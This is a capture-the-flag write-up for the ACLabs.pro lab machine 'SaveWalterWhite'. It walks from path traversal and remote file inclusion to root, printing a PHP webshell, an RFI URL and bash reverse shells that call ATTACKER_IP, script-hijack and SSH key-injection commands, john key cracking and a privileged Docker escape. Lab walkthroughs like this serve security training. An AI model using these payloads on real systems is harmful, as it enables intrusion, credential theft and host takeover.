# SaveWalterWhite — Aclabs.pro - WriteUP

![](https://img.shields.io/badge/Platform-ACLabs.pro-blue?style=for-the-badge)
![](https://img.shields.io/badge/Difficulty-Medium-orange?style=for-the-badge)
![](https://img.shields.io/badge/OS-Linux-informational?style=for-the-badge&logo=linux&logoColor=white)
![](https://img.shields.io/badge/Category-Web%20%7C%20LFI%20%7C%20RFI%20%7C%20PrivEsc%20%7C%20Docker-orange?style=for-the-badge)

<img width="1919" height="883" alt="SaveWalterWhite_aclabs pro" src="https://github.com/user-attachments/assets/94afc805-1c8c-4722-9ff1-512c11d8e945" />

## Summary

SaveWalterWhite is a **Medium**-rated Linux machine on Aclabs.pro featuring five flags across multiple layers of exploitation. An Apache web server exposes a PHP file inclusion endpoint (`image.php?file=`) that allows both **Path Traversal** (reading `/etc/passwd`) and **Remote File Inclusion**, getting RCE as `www-data`. A world-writable `backup.sh` script runnable as `jesse` via sudo provides the first lateral move (**Flag 1**). Database credentials found in `admin.php` lead to a Borg Backup passphrase hidden in a donations table, unlocking Saul's SSH key — which itself requires cracking with `john` (**Flag 2**). Saul's sudo permission to `tee` into Walter's `authorized_keys` grants SSH access as `walter` (**Flag 3**). A custom SUID binary expecting a Breaking Bad character alias ("Heisenberg") escalates to root inside the container (**Flag 4**). Finally, a **privileged Docker container escape** via host disk mounting yields the true root flag (**Flag 5**).

```
Path Traversal → RFI to RCE → sudo backup.sh → jesse (Flag 1)
  → DB creds → Borg passphrase → SSH key crack → saul (Flag 2)
  → sudo tee authorized_keys → walter (Flag 3)
  → SUID OSINT binary → container root (Flag 4)
  → Privileged container escape → host root (Flag 5)
```

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | ID |
|:------|:-------|:----------|:---|
| Port scanning | [Discovery](https://attack.mitre.org/tactics/TA0007/) | [Network Service Discovery](https://attack.mitre.org/techniques/T1046/) | `T1046` |
| Source code review | [Reconnaissance](https://attack.mitre.org/tactics/TA0043/) | [Gather Victim Host Info: Client Configurations](https://attack.mitre.org/techniques/T1592/004/) | `T1592.004` |
| Path Traversal / RFI | [Initial Access](https://attack.mitre.org/tactics/TA0001/) | [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/) | `T1190` |
| Remote PHP webshell | [Execution](https://attack.mitre.org/tactics/TA0002/) | [Command and Scripting Interpreter: Unix Shell](https://attack.mitre.org/techniques/T1059/004/) | `T1059.004` |
| Writable `backup.sh` abuse | [Privilege Escalation](https://attack.mitre.org/tactics/TA0004/) | [Abuse Elevation Control: Sudo and Sudo Caching](https://attack.mitre.org/techniques/T1548/003/) | `T1548.003` |
| Database credential extraction | [Credential Access](https://attack.mitre.org/tactics/TA0006/) | [Unsecured Credentials: Credentials In Files](https://attack.mitre.org/techniques/T1552/001/) | `T1552.001` |
| Borg passphrase from DB | [Credential Access](https://attack.mitre.org/tactics/TA0006/) | [Credentials from Password Stores](https://attack.mitre.org/techniques/T1555/) | `T1555` |
| SSH private key cracking | [Credential Access](https://attack.mitre.org/tactics/TA0006/) | [Brute Force: Password Cracking](https://attack.mitre.org/techniques/T1110/002/) | `T1110.002` |
| SSH key injection via `tee` | [Persistence](https://attack.mitre.org/tactics/TA0003/) | [Account Manipulation: SSH Authorized Keys](https://attack.mitre.org/techniques/T1098/004/) | `T1098.004` |
| SUID binary exploitation | [Privilege Escalation](https://attack.mitre.org/tactics/TA0004/) | [Abuse Elevation Control: Setuid and Setgid](https://attack.mitre.org/techniques/T1548/001/) | `T1548.001` |
| Privileged container escape | [Privilege Escalation](https://attack.mitre.org/tactics/TA0004/) | [Escape to Host](https://attack.mitre.org/techniques/T1611/) | `T1611` |

## CVSS Reference

| ID | CVSS 3.1 | Severity | Description |
|:----|:---------|:---------|:------------|
| Path Traversal | **4.3** (est.) | Medium | Path Traversal in `image.php` — unauthenticated arbitrary file read via `file` parameter CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N |
| RFI | **9.8** (est.) | Critical | Remote File Inclusion in `image.php` — unauthenticated RCE via remote PHP payload inclusion CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H |
| SUID Script | **7.8** (est.) | High | Writable SUID script executable via sudo — allows arbitrary command execution as another user CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H |
| Misconfiguration in Docker | **8.2** (est.) | High | Privileged Docker container — allows host filesystem mount and full host compromise CVSS:3.1/AV:L/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H |

## Reconnaissance — `T1046` `T1592.004`

### Nmap

```bash
sudo nmap -sC -sV $IP
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u5
80/tcp open  http    Apache httpd 2.4.56 ((Debian))
|_http-title: Save Walter White
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
```

Standard setup — SSH on 22, Apache on 80. Nothing exotic, but the real treasure is in the source code.

### Web Enumeration

<img width="1919" height="886" alt="SaveWalterWhite_website" src="https://github.com/user-attachments/assets/06e26f8f-4825-4f92-8e2b-b16154a5ea37" />


A themed fundraiser page for Walter White. No input fields, no obvious attack surface from the UI. The source code tells a different story:

<img width="1919" height="887" alt="SaveWalterWhite_website_source" src="https://github.com/user-attachments/assets/f3b1dc22-eb94-4ed9-a095-31fdb0ef08a7" />

The file `image.php` accepts a `?file=` parameter — a textbook file inclusion endpoint. Let's test it.

## Path Traversal — `T1190`

```
image.php?file=../../../../etc/passwd
```

<img width="1919" height="885" alt="SaveWalterWhite_path_traversal" src="https://github.com/user-attachments/assets/e441aa1f-3def-4957-94e7-6eab606329da" />


The file reads successfully, revealing three system users: `walt`, `saul`, and `jesse`. Other sensitive files are not readable due to permission restrictions — we need to escalate from Path Traversal to full RCE.

## RFI to RCE — `T1190` `T1059.004`

After exhausting LFI options, the next step from [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion) is **Remote File Inclusion** — making the server fetch and execute a PHP file from our attacker machine.

Create a minimal command php file on the attacker host:

```php
<?php system($_GET['cmd']); ?>
```

Serve it via Python:

```bash
python -m http.server 8888
```

Include the remote file through the vulnerable endpoint:

```
image.php?file=http://ATTACKER_IP:8888/cmd.php&cmd=id
```

<img width="1919" height="962" alt="SaveWalterWhite_RFI_to_RCE" src="https://github.com/user-attachments/assets/cbe34170-c575-4812-a075-8c86ed87b2ad" />

RCE confirmed. Now spawn a reverse shell (start a listener with `nc -vlnp 4444` first):

```bash
bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
```

> **Note:** The `bash -c` wrapper is essential — without it, the redirect operators aren't interpreted correctly by the PHP `system()` call. URL-encode the entire payload before sending via Burp Repeater (`Ctrl+U`).

<img width="1919" height="961" alt="SaveWalterWhite_ReverseShell" src="https://github.com/user-attachments/assets/f37e9a6c-1e3e-4be8-85f4-e2828330d2e8" />

## Flag 1 — Lateral Movement to jesse — `T1548.003`

First thing to check with a new shell:

```bash
sudo -l
```

```
User www-data may run the following commands on 50e6802eb8a3:
    (jesse) NOPASSWD: /opt/scripts/backup.sh
```

Check the script permissions:

```bash
ls -la /opt/scripts/backup.sh
-rwxrwxrwx 1 jesse jesse 940 Dec  2 17:31 /opt/scripts/backup.sh
```

World-writable. Replace its contents with a reverse shell (listener on port 5555):

```bash
echo "bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/5555 0>&1'" > /opt/scripts/backup.sh
sudo -u jesse /opt/scripts/backup.sh
```

Shell as `jesse`:

```bash
cat flag1.txt
flag_38ae3a7c98175e4aeff0b2a3d67aa3c4
```

## Flag 2 — From jesse to saul — `T1552.001` `T1555` `T1110.002`

### Discovering the Borg Backup

<img width="1132" height="628" alt="SaveWalterWhite_jesse_terminal_notes" src="https://github.com/user-attachments/assets/d4934a69-4c5a-4f95-8ac1-5810dcb69065" />

A note in jesse's home hints that Saul left a backup archive. Extracting it reveals a **Borg Backup** repository:

```bash
tar -xf saul-back.tar -C /tmp
cat /tmp/backup/README
```

```
This is a Borg Backup repository.
See https://borgbackup.readthedocs.io/
```

Borg isn't installed on the target, so we copy archive via scp:

```bash
scp -i id_rsa jesse@$IP:~/saul-back.tar .
```

### Finding the Borg Passphrase

Listing the backup requires a passphrase we don't have yet. Time to dig deeper.

The file `/var/www/html/admin.php` contains database credentials:

```php
$db = new mysqli('db', 'root', 'root', 'walter_fund');
```

No `mysql` client on the box, but `php` is available. Interactive PHP shell to the rescue:

```php
php -a
$db = new mysqli("db", "root", "root", "walter_fund");
$r = $db->query("SELECT * FROM donations");
while ($row = $r->fetch_assoc()) print_r($row);
```

Most entries are thematic (Jesse Pinkman, Gustavo Fring, etc.), but the last one stands out:

```
[donor_name] => S11pp1n000Jimmy
[amount] => 9999.00
```

`S11pp1n000Jimmy` — a value that looks far more like a passphrase than a donor name. Testing it against the Borg repository:

```bash
borg list ./backup
Enter passphrase for key: S11pp1n000Jimmy
saul-back    Mon, 2025-12-01 12:34:39 [c5a52d96...]
```

### Extracting Saul's SSH Key

```bash
borg extract ./backup::saul-back
```

This Saul's home directory with a `.ssh/id_rsa` — but the key is passphrase-protected:

```bash
ssh -i id_rsa saul@$IP
Enter passphrase for key 'id_rsa':
```

Crack it with `john`:

```bash
ssh2john id_rsa > hash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

```
ilovemike       (id_rsa)
```

SSH in as `saul` and grab the second flag:

```bash
cat flag2.txt
flag_751302c2172ca7e8ac68765f174406e1
```

## Flag 3 — From saul to walter — `T1098.004`

<img width="1132" height="637" alt="SaveWalterWhite_saul_ssh" src="https://github.com/user-attachments/assets/f1d180fb-2bea-4c78-8fce-f76d72d42fc5" />

A note hints that Saul can access Walter's account. Walter is in the `developers` group, and `sudo -l` confirms:

```bash
sudo -l
(walter) NOPASSWD: /usr/bin/tee -a /home/walter/.ssh/authorized_keys
```

Saul can **append to Walter's `authorized_keys`** via `tee`. Generate a fresh SSH key pair and inject it:

```bash
ssh-keygen -t rsa -N "" -f /tmp/walter
cat /tmp/walter.pub | sudo -u walter /usr/bin/tee -a /home/walter/.ssh/authorized_keys
ssh -i /tmp/walter walter@localhost
```

```bash
cat flag3.txt
flag_691bf4e515a877ab5227c6a8459e4c7c
```

## Flag 4 — Container Root via SUID OSINT — `T1548.001`

<img width="1133" height="632" alt="SaveWalterWhite_Walter_shell" src="https://github.com/user-attachments/assets/616d4d58-e101-483d-8865-ef11387a39d6" />

A custom SUID binary sits in Walter's home, and a note hints at "easy OSINT." The binary prompts for a name — clearly expecting a specific answer tied to the Breaking Bad theme.

<img width="1919" height="881" alt="SaveWalterWhite_OSINT" src="https://github.com/user-attachments/assets/791354aa-e255-49c4-af53-bf94ebc9f53a" />

Walter White's alter ego is **Heisenberg**:

```bash
./heisenberg_binary
Heisenberg
```

Root shell inside the container:

```bash
cat flag4.txt
flag_f17b8e2070286ae16fac5f2333338ad9
```

## Flag 5 — Privileged Container Escape — `T1611`

Despite having root, we're still inside a Docker container. Checking whether it's privileged:

```bash
ls /dev/
```

<img width="1130" height="632" alt="SaveWalterWhite_docker" src="https://github.com/user-attachments/assets/f5dd6fd5-5380-4dd5-9dc2-6379c2296be8" />

Host block devices (`sda`, `sda1`) are visible — this is a **privileged container** with full device access. The escape is trivial:

```bash
mkdir /mnt/host_root
mount /dev/sda1 /mnt/host_root
cat /mnt/host_root/root/root.txt
```

```
flag_c598ec6d71d1339cac6cba0b91df55cf
```

> **Flag 5** — true host root. Game over.

## Lessons Learned

1. **RFI is the big brother of LFI.** When Path Traversal hits permission walls, always test whether the inclusion endpoint fetches remote URLs. A single `http://` prefix can turn a file read into full RCE.

2. **World-writable scripts in sudo rules are instant wins.** The `backup.sh` script was writable by everyone and executable as `jesse` via sudo — a trivially exploitable combination. In real environments, scripts in sudoers should always be owned by root with restrictive permissions (`750` or tighter).

3. **Databases hide more than just data.** The Borg Backup passphrase was disguised as a donor name in a MySQL table. When stuck, enumerate every data store available — credentials and secrets often hide in application databases rather than config files.

4. **Borg Backup + passphrase-protected SSH keys = layered cracking.** This machine chained two credential-cracking steps: a passphrase to unlock the Borg archive (from the database), then `john` to crack the SSH key extracted from it. Each layer requires a different approach.

5. **`tee -a` to `authorized_keys` is a lateral movement primitive.** When sudo allows appending to another user's `authorized_keys`, generating and injecting a fresh key pair grants passwordless SSH access — cleaner and more reliable than reverse shells.

6. **Privileged containers are not security boundaries.** If `ls /dev/` shows host block devices, the container is privileged and the host filesystem is one `mount` command away. In production, containers should never run with `--privileged` unless absolutely necessary.

---

*Writeup by [@alfabuster](https://github.com/alfabuster)*
